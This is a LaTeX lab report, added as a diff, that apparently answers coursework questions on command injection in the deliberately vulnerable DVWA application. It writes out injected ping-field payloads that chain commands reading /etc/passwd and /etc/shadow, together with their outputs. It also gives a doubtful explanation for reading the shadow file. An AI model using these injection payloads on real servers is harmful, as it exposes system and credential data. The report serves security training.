@@ -1,0 +1,202 @@
+\documentclass[12pt]{article}
+\usepackage[margin=1in]{geometry}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{graphicx}
+\usepackage{float}
+
+\lstdefinelanguage{Bash}{
+    keywords={cd, ls, tar, python, objdump, grep, Enter},
+    sensitive=false,
+    comment=[l]{\#},
+    morecomment=[s]{/*}{*/},
+    morestring=[b]',
+    morestring=[b]",
+}
+
+\lstdefinestyle{terminal}{
+    % Removed the recursive style reference
+    backgroundcolor=\color{black},
+    basicstyle=\footnotesize\color{white}\ttfamily,
+    keywordstyle=\color{cyan},
+    commentstyle=\color{green},
+    stringstyle=\color{yellow},
+    showstringspaces=false,
+    breaklines=true,
+    frame=single,
+    framerule=0pt,
+    rulecolor=\color{black},
+}
+
+\title{Lab Report: Command Injection Vulnerability Exploration}
+\author{Your Name}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+
+\tableofcontents
+
+\section{Overview}
+
+In this lab, we explored a web application vulnerability called \textbf{command injection}. This vulnerability allows attackers to execute commands on the host operating system through a vulnerable web application. We used the Damn Vulnerable Web Application (DVWA) to demonstrate this.
+
+\section{Questions and Answers}
+
+\subsection{Question 1}
+
+\textbf{Q1. What is the web server’s IP address?}
+
+\subsubsection{Command Used}
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; ip addr
+\end{lstlisting}
+
+\subsubsection{Output Obtained}
+
+\begin{lstlisting}[style=terminal]
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.107 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.122 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.037 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3076ms
+rtt min/avg/max/mdev = 0.020/0.071/0.122/0.043 ms
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
+    inet \textbf{172.19.0.4}/16 brd 172.19.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+\end{lstlisting}
+
+\subsubsection{Answer}
+
+The web server's IP address is \textbf{172.19.0.4}.
+
+\subsection{Question 2}
+
+\textbf{Q2. What command did you use to get this information?}
+
+\subsubsection{Answer}
+
+
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; ip addr
+\end{lstlisting}
+
+\subsection{Question 3}
+
+\textbf{Q3. What is the username used by the web server application?}
+
+\subsubsection{Command Used}
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; whoami
+\end{lstlisting}
+
+\subsubsection{Output Obtained}
+
+\begin{lstlisting}[style=terminal]
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+[Ping results]
+
+www-data
+\end{lstlisting}
+
+\subsubsection{Answer}
+
+The username is \textbf{www-data}.
+
+\subsection{Question 4}
+
+\textbf{Q4. What command did you use to get this information?}
+
+\subsubsection{Answer}
+
+
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; whoami
+\end{lstlisting}
+
+\subsection{Question 5}
+
+\textbf{Q5. What is the account name of the most recent account created on the web server?}
+
+\subsubsection{Command Used}
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; tail -n 1 /etc/passwd
+\end{lstlisting}
+
+\subsubsection{Output Obtained}
+
+\begin{lstlisting}[style=terminal]
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+[Ping results]
+
+user:x:1000:1000:user:/home/user:/bin/sh
+\end{lstlisting}
+
+\subsubsection{Answer}
+
+The account name is \textbf{user}.
+
+\subsection{Question 6}
+
+\textbf{Q6. What command did you use to get this information?}
+
+\subsubsection{Answer}
+
+
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; tail -n 1 /etc/passwd
+\end{lstlisting}
+
+\subsection{Question 7}
+
+\textbf{Q7. Can you list the contents of the \texttt{/etc/shadow} file? Why might you NOT be able to list the contents of this file using the above technique?}
+
+\subsubsection{Attempted Command}
+
+\begin{lstlisting}[style=terminal]
+127.0.0.1; cat /etc/shadow
+\end{lstlisting}
+
+\subsubsection{Output Obtained}
+
+\begin{lstlisting}[style=terminal]
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+[Ping results]
+
+user:*:18605:0:99999:7:::
+\end{lstlisting}
+
+\subsubsection{Answer}
+
+Yes, I was able to see part of the \texttt{/etc/shadow} file. Normally, you should not be able to do this because the \texttt{/etc/shadow} file is only readable by the root user. The web server runs as \texttt{www-data}, which doesn't have permission to read this file. Accessing it shows a security problem, possibly due to the low security setting in DVWA.
+
+\section{Conclusion}
+
+In this lab, we exploited a command injection vulnerability to run commands on the web server. We found information like the server's IP address and user accounts. This highlights the need for proper input validation to prevent such vulnerabilities.
+
+\section{References}
+
+\begin{itemize}
+    \item \textbf{DVWA Official Website}: \url{http://www.dvwa.co.uk/}
+    \item \textbf{NIST SP 800-181}: National Initiative for Cybersecurity Education (NICE) Cybersecurity Workforce Framework: \url{http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-181.pdf}
+    \item \textbf{OWASP Command Injection}: \url{https://owasp.org/www-community/attacks/Command_Injection}
+\end{itemize}
+
+\end{document}
